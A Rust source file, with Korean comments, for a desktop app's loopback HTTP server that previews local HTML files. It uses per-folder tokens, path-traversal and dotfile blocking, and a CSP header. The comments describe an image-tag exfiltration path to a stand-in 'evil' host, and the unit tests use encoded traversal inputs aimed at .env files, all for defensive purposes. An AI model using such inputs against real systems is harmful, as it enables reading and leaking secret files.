//! 로컬 HTML 프리뷰 — 파일트리에서 우클릭한 `.html`을 앱 내장 브라우저에서 연다.
//!
//! ## 왜 루프백 HTTP 서버인가
//! macOS의 WKWebView(내장 브라우저의 네이티브 자식 webview)는 `file://`을 `loadRequest:`로
//! 못 띄운다(`loadFileURL:allowingReadAccessToURL:`가 필요한데 wry가 노출하지 않음). 게다가
//! 네이티브 경로의 `navigation_gate`(browser.rs)는 `file:`을 명시적 위협으로 차단한다. 반면
//! **`127.0.0.1` URL은 프론트의 `classifyMode`가 iframe 경로로 라우팅**해(browser.ts) React
//! `<iframe>`으로 렌더된다 — localhost dev 서버 프리뷰와 완전히 같은, 이미 검증된 경로다.
//! 그래서 파일과 그 형제 리소스를 루프백 HTTP로 흘려주고 그 URL을 브라우저 탭으로 연다.
//!
//! ## 서빙 루트 = 프리뷰 파일의 상위 폴더 (폴더별 포트)
//! 서버 루트를 파일의 **상위 폴더**로 잡으면 `./style.css`(상대)도, `/assets/app.js`(루트절대)도
//! 모두 그 폴더 기준으로 해석된다 — `python -m http.server`를 그 폴더에서 띄운 것과 동일한
//! 직관. path-prefix(`/{id}/...`) 방식은 루트절대 서브리소스를 놓치므로 쓰지 않는다. 폴더마다
//! 서버 하나를 띄우고 포트를 캐시한다(같은 폴더 재프리뷰는 재사용).
//!
//! ## 보안
//! - `127.0.0.1`에만 바인드, `GET`/`HEAD`만, **폴더별** 토큰(`?t=`) 필수 — 다른 로컬
//!   프로세스나 원격 페이지가 루프백으로 레포 파일을 읽는 것을 막고, 프리뷰된 페이지가
//!   자기 토큰을 유출해도 다른 폴더 서버에는 쓰지 못한다.
//! - 서브리소스(`./style.css` 등)는 쿼리에 토큰이 없다 — same-origin 요청의 `Referer`가
//!   토큰 포함 전체 URL을 실어오므로 "쿼리 OR Referer" 토큰을 인정한다. 토큰 없는 HTML
//!   내비게이션(페이지 간 링크)은 302로 토큰을 붙여 재귀적으로 이어지게 한다.
//! - 서빙 루트는 등록된 프로젝트 레포 안의 실제 폴더로만 확정된다(mint 시 정규화+컨테인먼트).
//! - 요청 경로는 서빙 루트에 join·정규화 후 루트 밖(`..`·심볼릭)이면 거부하고, `.`으로
//!   시작하는 세그먼트(`.git`/`.env`/`.ssh` 등)는 무조건 404 — 프리뷰된 악성 HTML이
//!   비밀 파일을 읽어 유출하는 것을 막는다(숨김 html 프리뷰는 포기하는 트레이드오프).
//! - 커넥션은 read/write 타임아웃 + 요청 크기 상한(64KB) + 동시 수 상한 — 인증 이전
//!   단계에서 로컬 프로세스가 스레드/메모리를 고갈시키지 못하게 한다.

use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read, Seek, SeekFrom, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use percent_encoding::{percent_decode_str, utf8_percent_encode, AsciiSet, CONTROLS};
use tauri::State;
use uuid::Uuid;

use crate::commands::projects::project_path;
use crate::commands::tree::resolve_in_repo;
use crate::error::{ErrorCode, IpcError};
use crate::state::AppState;

/// URL 경로 세그먼트에서 인코딩할 문자 — 비예약(unreserved) 밖은 전부. `/`?`#`&공백·한글 포함.
/// (RFC 3986 unreserved = ALPHA / DIGIT / `-` `.` `_` `~`)
const PATH_SEG: &AsciiSet = &CONTROLS
    .add(b' ')
    .add(b'"')
    .add(b'#')
    .add(b'%')
    .add(b'/')
    .add(b'<')
    .add(b'>')
    .add(b'?')
    .add(b'`')
    .add(b'{')
    .add(b'}')
    .add(b'\\')
    .add(b'^')
    .add(b'|');

/// 유휴 종료까지의 시간 — 프리뷰를 열어 두고 코드를 고치는 왕복을 견디는 최소치.
const IDLE_SECS: u64 = 600;
/// accept 폴링 주기 — 논블로킹 accept가 WouldBlock일 때 쉬는 시간(폐기·유휴 판정 주기이기도 하다).
const POLL: Duration = Duration::from_millis(250);

/// 한 폴더를 서빙하는 루프백 서버 한 대.
pub struct ServerEntry {
    port: u16,
    token: String,
    /// false로 내리면 accept 폴링 루프가 다음 tick에 스스로 종료한다(리스너 drop → 포트 해제).
    /// 폐기(revoke_under)와 유휴 종료가 공유하는 단일 신호다.
    alive: Arc<AtomicBool>,
    /// 마지막 활동 시각(서버 시작 기준 경과 초). 스레드가 유휴 판정에 쓰고, **mint도 재사용 시
    /// 갱신한다** — 유휴 직전(599초) 서버를 재사용해 URL을 내준 직후 폴링 tick이 그것을 죽이면
    /// 프론트는 살아있다고 믿는 포트가 닫혀 연결 거부가 되기 때문이다(재사용=활동으로 센다).
    last_hit: Arc<AtomicU64>,
    /// last_hit의 기준점 — mint가 "지금"을 같은 단위로 기록하려면 필요하다.
    started: Instant,
}

/// 프리뷰 루프백 서버 레지스트리 — base 폴더(정규화된 절대경로) → 서버.
#[derive(Default)]
pub struct PreviewServers {
    ports: HashMap<PathBuf, ServerEntry>,
}

impl PreviewServers {
    /// 주어진 경로 하위를 서빙하는 서버를 모두 폐기한다(프로젝트 제거 시). 폴링 루프가 다음
    /// tick에 종료하며, 레지스트리 엔트리는 여기서 즉시 빼 다음 mint가 새 서버를 띄우게 한다.
    /// 반환값은 폐기한 서버 수(로깅·테스트용).
    pub fn revoke_under(&mut self, root: &Path) -> usize {
        let doomed: Vec<PathBuf> = self
            .ports
            .keys()
            .filter(|base| base.starts_with(root))
            .cloned()
            .collect();
        for base in &doomed {
            if let Some(e) = self.ports.remove(base) {
                e.alive.store(false, Ordering::Relaxed);
            }
        }
        doomed.len()
    }
}

/// 파일트리 우클릭 → `.html`을 내장 브라우저에서 열 URL을 만든다.
/// `(project_id, rel_path)`만 받아 서버측에서 절대경로를 확정한다(run_executable과 같은 계약).
#[tauri::command]
pub fn preview_local_url(
    state: State<'_, AppState>,
    project_id: String,
    rel_path: String,
) -> Result<String, IpcError> {
    let repo = project_path(&state, &project_id)?;
    // 상위까지는 resolve_in_repo가 정규화·컨테인먼트를 보장한다. 최종 대상도 정규화해
    // 마지막 컴포넌트가 심볼릭 링크로 레포 밖을 가리키는 경우까지 막는다(읽기판 방어).
    let target = resolve_in_repo(&repo, &rel_path)?;
    let target = dunce::canonicalize(&target)
        .map_err(|_| IpcError::new(ErrorCode::NotFound, "파일을 찾을 수 없습니다"))?;
    let repo_canon = dunce::canonicalize(&repo)
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("레포 경로 확인 실패: {e}")))?;
    if !target.starts_with(&repo_canon) {
        return Err(IpcError::new(ErrorCode::Io, "레포 밖 경로입니다"));
    }
    if !target.is_file() {
        return Err(IpcError::new(ErrorCode::NotFound, "파일을 찾을 수 없습니다"));
    }

    // 서빙 루트 = 파일의 상위 폴더(이미 정규화됨). 파일은 그 루트의 최상위에 위치한다.
    let base = target
        .parent()
        .ok_or_else(|| IpcError::new(ErrorCode::Io, "상위 폴더를 찾을 수 없습니다"))?
        .to_path_buf();
    let file_name = target
        .file_name()
        .and_then(|s| s.to_str())
        .ok_or_else(|| IpcError::new(ErrorCode::Io, "파일 이름을 읽을 수 없습니다"))?
        .to_string();

    let mut reg = state.preview.lock().unwrap();
    // 살아있는 서버만 재사용한다 — 유휴 종료된 서버가 남긴 스테일 엔트리는 없는 것으로 보고
    // 새로 띄운다(자기 치유). 덕분에 종료된 스레드가 레지스트리를 직접 건드릴 필요가 없다.
    let reusable = reg
        .ports
        .get(&base)
        .filter(|e| e.alive.load(Ordering::Relaxed))
        .map(|e| {
            // 재사용도 활동이다 — 갱신하지 않으면 유휴 임계에 걸친 서버를 내주고 곧바로
            // 스레드가 죽여 연결 거부가 된다.
            e.last_hit
                .store(e.started.elapsed().as_secs(), Ordering::Relaxed);
            (e.port, e.token.clone())
        });
    let (port, token) = match reusable {
        Some(v) => v,
        None => {
            let token = Uuid::new_v4().simple().to_string();
            let entry = start_server(base.clone(), token.clone())?;
            let v = (entry.port, entry.token.clone());
            reg.ports.insert(base.clone(), entry); // 스테일 엔트리가 있으면 덮어쓴다
            v
        }
    };
    drop(reg);

    let enc = utf8_percent_encode(&file_name, PATH_SEG).to_string();
    Ok(format!("http://127.0.0.1:{port}/{enc}?t={token}"))
}

/// base 폴더를 루트로 하는 루프백 서버를 띄운다.
///
/// accept 루프는 **논블로킹 + 폴링**이다. 블로킹 `accept()`는 깨울 방법이 없어 서버가 프로세스
/// 종료까지 살아남았는데(프로젝트를 제거해도 계속 서빙), 폴링으로 바꾸면 같은 루프에서 폐기
/// (`alive=false`)와 유휴 종료를 함께 처리할 수 있다. 유휴 시 비용은 초당 4회 WouldBlock뿐이다.
fn start_server(base: PathBuf, token: String) -> Result<ServerEntry, IpcError> {
    let listener = std::net::TcpListener::bind(("127.0.0.1", 0))
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("프리뷰 서버 시작 실패: {e}")))?;
    let port = listener
        .local_addr()
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("포트 확인 실패: {e}")))?
        .port();
    listener
        .set_nonblocking(true)
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("논블로킹 설정 실패: {e}")))?;

    let alive = Arc::new(AtomicBool::new(true));
    let last_hit = Arc::new(AtomicU64::new(0));
    let (t_alive, t_hit) = (alive.clone(), last_hit.clone());
    let t_token = token.clone(); // 스레드로 move할 사본 — 원본은 ServerEntry가 보관한다
    // 기준점을 스레드 밖에서 잡아 ServerEntry와 공유한다 — mint가 재사용 시 같은 단위로
    // last_hit을 갱신할 수 있어야 한다.
    let started = Instant::now();

    std::thread::Builder::new()
        .name("html-preview".into())
        .spawn(move || {
            loop {
                if !t_alive.load(Ordering::Relaxed) {
                    return; // 폐기됨(프로젝트 제거) — 리스너가 drop되며 포트가 해제된다
                }
                match listener.accept() {
                    Ok((stream, _)) => {
                        // ⚠️ accept된 스트림은 플랫폼에 따라 논블로킹을 상속한다. handle_conn은
                        // 타임아웃 있는 블로킹 I/O를 전제하므로 반드시 되돌린다 — 안 하면
                        // 요청 파싱이 WouldBlock으로 즉시 실패한다.
                        if stream.set_nonblocking(false).is_err() {
                            continue;
                        }
                        t_hit.store(started.elapsed().as_secs(), Ordering::Relaxed);
                        let base = base.clone();
                        let token = t_token.clone();
                        let hit = t_hit.clone();
                        let al = t_alive.clone();
                        // 커넥션마다 워커 스레드 — 느린 요청이 다른 서브리소스 요청을 막지 않게.
                        let _ = std::thread::Builder::new()
                            .name("html-preview-conn".into())
                            .spawn(move || {
                                let _ = handle_conn(stream, &base, &token, &al, &hit, started);
                            });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        // 대기 중인 커넥션 없음 — 쉬면서 폐기·유휴를 판정한다.
                        // (sleep 없이 continue하면 CPU를 태우는 바쁜 루프가 된다.)
                        std::thread::sleep(POLL);
                        let idle = started
                            .elapsed()
                            .as_secs()
                            .saturating_sub(t_hit.load(Ordering::Relaxed));
                        if idle > IDLE_SECS {
                            // 탭을 닫았든 사용자가 떠났든 요청이 끊긴 것은 같다 — 한 조건으로 덮는다.
                            // 레지스트리 엔트리는 남지만 alive=false라 다음 mint가 새로 띄운다.
                            t_alive.store(false, Ordering::Relaxed);
                            return;
                        }
                    }
                    Err(_) => return, // 리스너가 못 쓰게 됨 — 스레드 종료(다음 mint가 재생성)
                }
            }
        })
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("프리뷰 스레드 생성 실패: {e}")))?;

    Ok(ServerEntry { port, token, alive, last_hit, started })
}

/// 동시 커넥션 상한 — 인증 이전 단계에서 스레드 고갈을 막는 안전판(프리뷰 페이지 하나의
/// 정상 서브리소스 로딩은 브라우저가 host당 6개 안팎으로 제한하므로 여유가 크다).
const MAX_CONNS: usize = 64;
static CONNS: AtomicUsize = AtomicUsize::new(0);
struct ConnGuard;
impl Drop for ConnGuard {
    fn drop(&mut self) {
        CONNS.fetch_sub(1, Ordering::Relaxed);
    }
}

/// 쿼리 문자열(`a=1&t=..`)에 t=token이 있는가.
fn has_token(query: &str, token: &str) -> bool {
    query.split('&').any(|kv| {
        kv.split_once('=')
            .map(|(k, v)| k == "t" && v == token)
            .unwrap_or(false)
    })
}

/// `Range: bytes=start-end` / `bytes=start-` 단일 범위 파싱 → (start, inclusive end).
/// 그 외 형태(suffix `-N`, 다중 범위)는 None — 호출부가 200 전체 응답으로 폴백한다(스펙 허용).
fn parse_range(value: &str, len: u64) -> Option<(u64, u64)> {
    let spec = value.trim().strip_prefix("bytes=")?;
    let (s, e) = spec.split_once('-')?;
    let start: u64 = s.trim().parse().ok()?;
    let end: u64 = match e.trim() {
        "" => len.saturating_sub(1),
        v => v.parse::<u64>().ok()?.min(len.saturating_sub(1)),
    };
    if start > end {
        return None;
    }
    Some((start, end))
}

/// 요청 경로(`/sub/dir/app.js` 등) → base 안의 실제 파일 경로. 탈출·비밀파일이면 None.
/// handle_conn에서 분리해 유닛테스트로 우회 경로를 봉쇄한다.
///
/// 각 `/`-분리 세그먼트를 퍼센트 디코드한 뒤, **디코드 결과가 단일 평문 컴포넌트가 아니면
/// 거부**한다 — `%2F`/`%5C`(경로 구분자), 절대경로, `..`, `.`을 한 번에 막는다. 이 검사가
/// 없으면 `src%2F..%2F.git%2Fconfig` 한 세그먼트가 디코드 시 `src/../.git/config`로 풀려
/// PathBuf::push가 여러 컴포넌트로 붙여 dotfile 차단을 우회한다. `.`으로 시작하는 세그먼트도
/// 거부해 `.git`/`.env` 등 비밀 파일 유출을 막는다(모듈 doc § 보안).
fn resolve_request_path(base: &Path, path_part: &str) -> Option<PathBuf> {
    let rel = path_part.trim_start_matches('/');
    let mut joined = base.to_path_buf();
    for seg in rel.split('/') {
        if seg.is_empty() || seg == "." {
            continue;
        }
        let decoded = percent_decode_str(seg).decode_utf8_lossy();
        // 구분자·절대·상위·dotfile 세그먼트를 전부 거부 — 단일 Normal 컴포넌트만 허용.
        if decoded.contains('/') || decoded.contains('\\') || decoded.starts_with('.') {
            return None;
        }
        let mut comps = Path::new(decoded.as_ref()).components();
        match (comps.next(), comps.next()) {
            (Some(std::path::Component::Normal(c)), None) => joined.push(c),
            _ => return None,
        }
    }
    // 정규화 후 base 안에 있는지 확인 — 심볼릭 이탈까지 차단. 없는 파일이면 정규화 실패 → None.
    let resolved = dunce::canonicalize(&joined).ok()?;
    if !resolved.starts_with(base) || !resolved.is_file() {
        return None;
    }
    Some(resolved)
}

/// 한 커넥션 처리 — 요청 라인/헤더를 읽고 base 안의 파일 하나를 응답한다. keep-alive 없음,
/// Range는 단일 범위만(WKWebView 미디어 재생에 필요).
fn handle_conn(
    stream: TcpStream,
    base: &Path,
    token: &str,
    alive: &AtomicBool,
    last_hit: &AtomicU64,
    started: Instant,
) -> std::io::Result<()> {
    CONNS.fetch_add(1, Ordering::Relaxed);
    let _guard = ConnGuard;
    let mut stream = stream;
    if CONNS.load(Ordering::Relaxed) > MAX_CONNS {
        return write_status(&mut stream, 503, "Service Unavailable");
    }
    // 폐기된 서버(프로젝트 제거)로 들어온 잔여 커넥션 — 파일을 주지 않는다.
    if !alive.load(Ordering::Relaxed) {
        return write_status(&mut stream, 503, "Service Unavailable");
    }
    // 유휴 판정 갱신 — 서브리소스 요청까지 활동으로 세어 프리뷰 중 서버가 죽지 않게.
    last_hit.store(started.elapsed().as_secs(), Ordering::Relaxed);
    // 느린/멈춘 클라이언트가 워커 스레드를 영구 점유하지 못하게 — 루프백에서 10s는 충분.
    let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(30)));
    // 요청 라인+헤더 총량 64KB 상한 — 무제한 read_line로 메모리가 자라지 못하게.
    let mut reader = BufReader::new(stream.try_clone()?).take(64 * 1024);

    // 요청 라인: "GET /path?query HTTP/1.1"
    let mut request_line = String::new();
    if reader.read_line(&mut request_line)? == 0 {
        return Ok(());
    }

    // 헤더를 빈 줄까지 소비(본문은 무시). Referer(서브리소스 토큰 상속)와 Range만 캡처.
    let mut referer = String::new();
    let mut range_hdr = String::new();
    for _ in 0..100 {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 {
            break;
        }
        if line == "\r\n" || line == "\n" {
            break;
        }
        if let Some((name, value)) = line.split_once(':') {
            if name.eq_ignore_ascii_case("referer") {
                referer = value.trim().to_string();
            } else if name.eq_ignore_ascii_case("range") {
                range_hdr = value.trim().to_string();
            }
        }
    }

    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or("");
    let raw_target = parts.next().unwrap_or("");
    let head_only = match method {
        "GET" => false,
        "HEAD" => true,
        _ => return write_status(&mut stream, 405, "Method Not Allowed"),
    };

    // target 분해: "/path?query"
    let (path_part, query) = match raw_target.split_once('?') {
        Some((p, q)) => (p, q),
        None => (raw_target, ""),
    };

    // 토큰 검증 — 다른 로컬/원격 출처가 토큰 없이 레포 파일을 읽지 못하게.
    // 서브리소스(./style.css)는 쿼리에 토큰이 없지만, same-origin 요청의 Referer가
    // "http://127.0.0.1:p/index.html?t=…" 전체 URL을 실어오므로 그 쿼리의 토큰을 인정한다.
    // 토큰을 모르면 Referer도 위조할 수 없어 위협 모델은 동일하다.
    let query_ok = has_token(query, token);
    let referer_ok = referer
        .split_once('?')
        .map(|(_, q)| has_token(q, token))
        .unwrap_or(false);
    if !query_ok && !referer_ok {
        return write_status(&mut stream, 403, "Forbidden");
    }

    // 요청 경로 → base 안의 실제 파일 (탈출·비밀파일 거부). 실패는 전부 404.
    let resolved = match resolve_request_path(base, path_part) {
        Some(p) => p,
        None => return write_status(&mut stream, 404, "Not Found"),
    };

    // 쿼리 토큰 없이 Referer로만 통과한 요청(HTML 페이지 간 링크뿐 아니라 그 페이지가 부른
    // CSS·ES 모듈이 *다시* 부르는 2단계 서브리소스 포함)은 302로 `?t=`를 붙여, 서빙되는 모든
    // 리소스의 최종 URL이 토큰을 갖게 한다 → 후손 요청도 Referer로 토큰을 상속해 체인이
    // 재귀적으로 이어진다. 원래 쿼리스트링은 보존한다(location.search 의존 페이지가 안 깨지게).
    if !query_ok {
        let sep = if query.is_empty() { "" } else { "&" };
        let resp = format!(
            "HTTP/1.1 302 Found\r\nLocation: {path_part}?{query}{sep}t={token}\r\n\
             Content-Length: 0\r\nConnection: close\r\n\r\n"
        );
        return stream.write_all(resp.as_bytes());
    }

    let mut file = match std::fs::File::open(&resolved) {
        Ok(f) => f,
        Err(_) => return write_status(&mut stream, 404, "Not Found"),
    };
    let len = file.metadata().map(|m| m.len()).unwrap_or(0);
    let ctype = content_type(&resolved);

    // Range(단일 범위)면 206 — WKWebView는 미디어(mp4 등)를 Range 없이는 재생하지 못한다.
    let range = if range_hdr.is_empty() { None } else { parse_range(&range_hdr, len) };
    if !range_hdr.is_empty() && range.is_none() && len > 0 {
        // bytes=start-end 파싱 실패 중 "시작이 파일 밖"인 명백한 케이스는 416으로 알린다.
        if let Some(spec) = range_hdr.trim().strip_prefix("bytes=") {
            if let Some((s, _)) = spec.split_once('-') {
                if s.trim().parse::<u64>().map(|v| v >= len).unwrap_or(false) {
                    let resp = format!(
                        "HTTP/1.1 416 Range Not Satisfiable\r\nContent-Range: bytes */{len}\r\n\
                         Content-Length: 0\r\nConnection: close\r\n\r\n"
                    );
                    return stream.write_all(resp.as_bytes());
                }
            }
        }
    }

    let (status, start, body_len, extra) = match range {
        Some((s, e)) if s < len => (
            "206 Partial Content",
            s,
            e - s + 1,
            format!("Content-Range: bytes {s}-{e}/{len}\r\n"),
        ),
        _ => ("200 OK", 0, len, String::new()),
    };

    let header = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Length: {body_len}\r\n{extra}\
         {}Accept-Ranges: bytes\r\nCache-Control: no-store\r\nX-Content-Type-Options: nosniff\r\n\
         Connection: close\r\n\r\n",
        csp_header(&resolved)
    );
    stream.write_all(header.as_bytes())?;
    if head_only {
        return Ok(());
    }
    // 본문 스트리밍 — 큰 파일도 통째로 메모리에 올리지 않는다. Range면 구간만.
    if start > 0 {
        file.seek(SeekFrom::Start(start))?;
    }
    let mut remaining = body_len;
    let mut buf = [0u8; 64 * 1024];
    while remaining > 0 {
        let want = remaining.min(buf.len() as u64) as usize;
        let n = file.read(&mut buf[..want])?;
        if n == 0 {
            break;
        }
        stream.write_all(&buf[..n])?;
        remaining -= n as u64;
    }
    Ok(())
}

fn write_status(stream: &mut TcpStream, code: u16, reason: &str) -> std::io::Result<()> {
    let body = format!("{code} {reason}");
    let resp = format!(
        "HTTP/1.1 {code} {reason}\r\nContent-Type: text/plain; charset=utf-8\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    stream.write_all(resp.as_bytes())
}

/// 문서(HTML/XHTML) 응답에 붙일 CSP 헤더 — 그 외 확장자는 빈 문자열(CSP는 문서가 소유한다).
///
/// 프리뷰된 HTML은 `allow-same-origin` iframe 안에서 자기 토큰을 가지므로, 서빙 루트의 형제
/// 파일을 읽어 원격으로 보낼 수 있다. `.git`/`.env` 차단(resolve_request_path)과 폴더별 토큰으로
/// 노출 범위는 이미 좁지만, **전송 채널** 자체를 여기서 막는다:
///   - `connect-src 'self'` : fetch/XHR/WebSocket/sendBeacon 원격 전송 차단 (주 유출 경로)
///   - `form-action 'none'` : 폼 POST 유출 차단
///   - `object-src 'none'` / `base-uri 'self'` : 플러그인·base 태그 우회 차단
///
/// `default-src`는 **의도적으로 지정하지 않는다** — 로컬 HTML 프리뷰는 CDN 스크립트·폰트·외부
/// 이미지를 흔히 쓰고(정상 사용의 대다수), 이를 막으면 기능 자체의 가치가 떨어진다. 그 대가로
/// `<img src="https://evil/?d=…">` 류의 유출은 남는다 — 완전 격리가 필요하면 `default-src 'self'`가
/// 필요하나 CDN 프리뷰를 깨므로 별도 옵트인 설정으로 다룬다(browser-preview-hardening-design §3.3).
///
/// `frame-ancestors`는 **넣으면 안 된다**: 프리뷰는 앱 origin(tauri://localhost)이 127.0.0.1을
/// iframe으로 감싸는 교차 출처 구조라 iframe 자체가 차단돼 기능이 죽는다.
fn csp_header(path: &Path) -> &'static str {
    match path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_ascii_lowercase())
        .as_deref()
    {
        Some("html" | "htm" | "xhtml") => {
            "Content-Security-Policy: connect-src 'self'; form-action 'none'; \
             object-src 'none'; base-uri 'self'\r\n"
        }
        _ => "",
    }
}

/// 확장자 → MIME. 서브리소스(css/js/img/font/wasm)까지 브라우저가 올바로 해석하도록.
fn content_type(path: &Path) -> &'static str {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    match ext.as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "xhtml" => "application/xhtml+xml; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" | "cjs" => "text/javascript; charset=utf-8",
        "json" | "map" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "avif" => "image/avif",
        "ico" => "image/x-icon",
        "bmp" => "image/bmp",
        "wasm" => "application/wasm",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "txt" | "md" => "text/plain; charset=utf-8",
        "xml" => "application/xml; charset=utf-8",
        "wav" => "audio/wav",
        "mp3" => "audio/mpeg",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        _ => "application/octet-stream",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn path_seg_encodes_reserved_and_unicode() {
        assert_eq!(utf8_percent_encode("a b#c?d", PATH_SEG).to_string(), "a%20b%23c%3Fd");
        assert_eq!(utf8_percent_encode("sub/dir", PATH_SEG).to_string(), "sub%2Fdir");
        // 한글은 UTF-8 바이트로 인코딩
        assert_eq!(utf8_percent_encode("가", PATH_SEG).to_string(), "%EA%B0%80");
        // 비예약은 그대로
        assert_eq!(utf8_percent_encode("app-1.2_x~y", PATH_SEG).to_string(), "app-1.2_x~y");
    }

    #[test]
    fn token_in_query() {
        assert!(has_token("t=abc", "abc"));
        assert!(has_token("x=1&t=abc&y=2", "abc"));
        assert!(!has_token("t=abcd", "abc"));
        assert!(!has_token("T=abc", "abc")); // 대소문자 구분 — 키는 소문자 t만
        assert!(!has_token("", "abc"));
        assert!(!has_token("t2=abc&u=t%3Dabc", "abc"));
    }

    #[test]
    fn range_single_forms() {
        assert_eq!(parse_range("bytes=0-99", 1000), Some((0, 99)));
        assert_eq!(parse_range("bytes=500-", 1000), Some((500, 999)));
        assert_eq!(parse_range("bytes=0-5000", 1000), Some((0, 999))); // end 클램프
        assert_eq!(parse_range("bytes=700-600", 1000), None); // 역전
        assert_eq!(parse_range("bytes=-500", 1000), None); // suffix 미지원 → 200 폴백
        assert_eq!(parse_range("bytes=0-1,5-9", 1000), None); // 다중 범위 미지원
        assert_eq!(parse_range("items=0-9", 1000), None);
    }

    #[test]
    fn content_type_by_ext() {
        assert_eq!(content_type(Path::new("/a/index.html")), "text/html; charset=utf-8");
        assert_eq!(
            content_type(Path::new("/a/page.xhtml")),
            "application/xhtml+xml; charset=utf-8"
        );
        assert_eq!(content_type(Path::new("/a/style.CSS")), "text/css; charset=utf-8");
        assert_eq!(content_type(Path::new("/a/app.mjs")), "text/javascript; charset=utf-8");
        assert_eq!(content_type(Path::new("/a/logo.svg")), "image/svg+xml");
        assert_eq!(content_type(Path::new("/a/data.bin")), "application/octet-stream");
    }

    #[test]
    fn csp_only_on_documents() {
        assert!(csp_header(Path::new("/a/index.html")).contains("connect-src 'self'"));
        assert!(csp_header(Path::new("/a/p.XHTML")).contains("form-action 'none'"));
        // 문서가 아닌 서브리소스엔 붙이지 않는다(CSP는 문서가 소유한다).
        assert_eq!(csp_header(Path::new("/a/style.css")), "");
        assert_eq!(csp_header(Path::new("/a/app.js")), "");
        // frame-ancestors는 절대 넣지 않는다 — 교차 출처 iframe이 차단돼 기능이 죽는다.
        assert!(!csp_header(Path::new("/a/index.html")).contains("frame-ancestors"));
        // default-src도 넣지 않는다 — CDN 스크립트/폰트를 쓰는 정상 프리뷰가 깨진다.
        assert!(!csp_header(Path::new("/a/index.html")).contains("default-src"));
    }

    #[test]
    fn revoke_under_kills_only_matching_subtree() {
        let mut reg = PreviewServers::default();
        let mk = || ServerEntry {
            port: 1,
            token: "t".into(),
            alive: Arc::new(AtomicBool::new(true)),
            last_hit: Arc::new(AtomicU64::new(0)),
            started: Instant::now(),
        };
        let inside = PathBuf::from("/repos/alpha/docs");
        let root = PathBuf::from("/repos/alpha");
        let other = PathBuf::from("/repos/beta");
        // 문자열 접두사로 비교하면 잘못 폐기될 이름 — Path::starts_with는 컴포넌트 단위라 안전.
        let sibling = PathBuf::from("/repos/alpha2");
        let inside_alive = mk();
        let other_alive = mk();
        let sib_alive = mk();
        let (ia, oa, sa) = (
            inside_alive.alive.clone(),
            other_alive.alive.clone(),
            sib_alive.alive.clone(),
        );
        reg.ports.insert(inside, inside_alive);
        reg.ports.insert(root.clone(), mk());
        reg.ports.insert(other.clone(), other_alive);
        reg.ports.insert(sibling.clone(), sib_alive);

        assert_eq!(reg.revoke_under(&root), 2); // 레포 루트 + 그 하위 폴더만
        assert!(!ia.load(Ordering::Relaxed)); // 하위 서버는 종료 신호를 받는다
        assert!(oa.load(Ordering::Relaxed)); // 다른 레포는 건드리지 않는다
        assert!(sa.load(Ordering::Relaxed)); // "alpha2"는 "alpha" 하위가 아니다
        assert!(reg.ports.contains_key(&other)); // 엔트리도 남는다
        assert!(reg.ports.contains_key(&sibling));
        assert!(!reg.ports.contains_key(&root)); // 폐기된 것은 즉시 빠져 다음 mint가 새로 띄운다
    }

    #[test]
    fn resolve_request_path_blocks_traversal_and_dotfiles() {
        // 실제 파일시스템으로 검증 — canonicalize가 존재하는 경로를 요구한다.
        let dir = std::env::temp_dir().join(format!("gpv-preview-{}", Uuid::new_v4().simple()));
        let sub = dir.join("assets");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::write(dir.join("index.html"), b"<html>").unwrap();
        std::fs::write(sub.join("app.js"), b"//js").unwrap();
        std::fs::write(dir.join(".env"), b"SECRET=1").unwrap();
        std::fs::write(sub.join(".secret"), b"x").unwrap();
        let base = dunce::canonicalize(&dir).unwrap();

        // 정상 경로는 해석된다.
        assert!(resolve_request_path(&base, "/index.html").is_some());
        assert!(resolve_request_path(&base, "/assets/app.js").is_some());

        // %2F로 세그먼트에 구분자를 밀어넣어 dotfile·상위 이탈을 시도 — 전부 거부.
        assert!(resolve_request_path(&base, "/assets%2F..%2F.env").is_none());
        assert!(resolve_request_path(&base, "/assets%2F.secret").is_none());
        assert!(resolve_request_path(&base, "/assets%5C.secret").is_none());
        // 평문 dotfile·상위 세그먼트도 거부.
        assert!(resolve_request_path(&base, "/.env").is_none());
        assert!(resolve_request_path(&base, "/assets/.secret").is_none());
        assert!(resolve_request_path(&base, "/../secret").is_none());
        // 존재하지 않는 파일은 None.
        assert!(resolve_request_path(&base, "/nope.js").is_none());
        // 디렉토리는 파일이 아니므로 None.
        assert!(resolve_request_path(&base, "/assets").is_none());

        let _ = std::fs::remove_dir_all(&dir);
    }
}
